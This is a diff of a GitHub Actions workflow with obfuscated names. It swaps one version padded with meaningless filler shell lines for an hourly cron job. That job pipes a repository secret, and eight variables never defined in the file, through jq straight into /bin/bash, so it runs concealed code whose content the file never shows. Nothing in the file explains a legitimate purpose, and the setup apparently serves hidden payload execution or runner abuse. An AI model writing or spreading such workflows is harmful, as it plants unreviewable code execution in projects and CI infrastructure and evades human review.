@@ -1,56 +1,27 @@
-name: fukangan6371 #9872
-on: #19643
-  workflow_dispatch: #26971
-  schedule: #1105
-    - cron: '6 4/6 * * *' #16527
-jobs:  # 11202
-  build: #24077
-    runs-on: ubuntu-latest #7828
-    steps: #27956
-      - uses: actions/checkout@v4 #26873
-      - name: fukangan6371 #8040
-        env: #29205
-          b20006: ${{ secrets.b20006 }} #352
+name: fukangan6371
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fukangan6371
+        env:
+          ytm33208: ${{ secrets.ytm33208 }}
         run: |
-          echo $b20006 | jq -r .y25566 | /bin/bash #11203
-          echo "History mock: history | head -1 2>/dev/null || echo no-history"
-          echo "Debug at $(date)"
-          echo "Conditional: [[ 'a' == 'a' ]] && echo Match"
-          echo "Grep mock: grep 'a' <<< 'abc' 2>/dev/null || echo no-grep"
-          echo "Exit mock: exit 0 2>/dev/null || true"
-          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
-          ls -la 2>/dev/null || true
-          echo "Complex pipe: echo test | tr a-z A-Z | cut -c1-3"
-          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
-          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
-          echo "Null cmd: : > /dev/null"
-          echo "Random ID: $RANDOM$RANDOM"
-          echo "Time ms-like: $(date +%s%3N 2>/dev/null || echo 123456)"
-          sleep 0.1 2>/dev/null || true
-          echo "Time diff mock: echo \$SECONDS"
-          echo "Git mock: git --version 2>/dev/null | head -1 || echo no-git"
-          echo "Files: $(ls | wc -l 2>/dev/null || echo 0)"
-          echo "Command || true: ls /nonexist || true"
-          echo "File test: [ -e /etc/passwd ] && echo Passwd exists"
-          echo "Random sleep: sleep $((RANDOM % 2)) 2>/dev/null || true"
-          echo "Eval mock: eval 'echo eval-test'"
-          echo "Version: $((1 + RANDOM % 5))"
-          echo "Var op: v=1; echo \$((v+1))"
-          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
-          echo "Tmp cleanup: rm -f /tmp/.tmp* 2>/dev/null || true"
-          for i in {1..3}; do echo "Iter $i"; done
-          echo "Bit ops: $(( 1 & 1 ))"
-          echo "Array-like: a=1 b=2 c=3; echo \$a\$b\$c"
-          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
-          echo "Command count: echo \$(ls | wc -l 2>/dev/null || echo 0)"
-          echo "Binary check: command -v bash 2>/dev/null && echo Bash"
-          echo "Brace exp: echo file_{1..3}.txt"
-          echo "Export mock: export VAR=test"
-          echo "Disk usage (fake): $(df -h . 2>/dev/null | tail -1 || echo N/A)"
-          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          [ -z "$RANDOM" ] || echo "Random var set"
-          echo "Tar mock: tar -cf /dev/null /tmp 2>/dev/null || true"
-          test -d /tmp && echo "Tmp dir exists"
-          echo "Awk mock: echo '1 2' | awk '{print \$1}' 2>/dev/null || echo no-awk"
-          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
-          echo "IO redirect: echo > file 2>/dev/null || true"
+          echo $ytm33208 | jq -r .csh5098 | /bin/bash
+          echo $pxj769 | jq -r .x605 | /bin/bash
+          echo $eew0974 | jq -r .vdizh744 | /bin/bash
+          echo $ud1033 | jq -r .yfdwd6625 | /bin/bash
+          echo $fetpw26352 | jq -r .pzmmv9977 | /bin/bash
+          echo $bgfim27 | jq -r .jv9 | /bin/bash
+          echo $bng6165 | jq -r .yggtu15241 | /bin/bash
+          echo $ar7872 | jq -r .slhf80 | /bin/bash
+          echo $xhr01140 | jq -r .tbqcw386 | /bin/bash
+
